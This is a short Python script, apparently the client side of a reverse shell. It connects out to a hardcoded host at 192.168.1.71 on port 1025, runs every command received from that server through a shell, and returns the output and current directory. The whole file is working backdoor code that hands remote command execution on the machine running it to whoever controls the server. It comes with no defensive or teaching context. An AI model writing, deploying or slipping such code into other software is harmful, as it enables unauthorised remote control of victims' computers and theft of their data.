import socket
import subprocess
import os
import sys

#creating a socket and connecting to server
host = '192.168.1.71'
port = 1025
s = socket.socket()
s.connect((host , port)) # connecting to server
print('Connected to server.py')

while True:
    data = str(s.recv(1024) , 'utf-8')
    if data[:2] == 'cd':
        os.chdir(data[3:])

    if data == 'quit' or data == 'exit':
        s.close()
        sys.exit()

    if len(data) > 0:
        cmd = subprocess.Popen(data , shell=True , stdin=subprocess.PIPE , stdout=subprocess.PIPE , stderr=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes , 'utf-8')
        cwd = os.getcwd()
        s.send(str.encode(output_str + cwd , 'utf-8'))
        print(output_str)

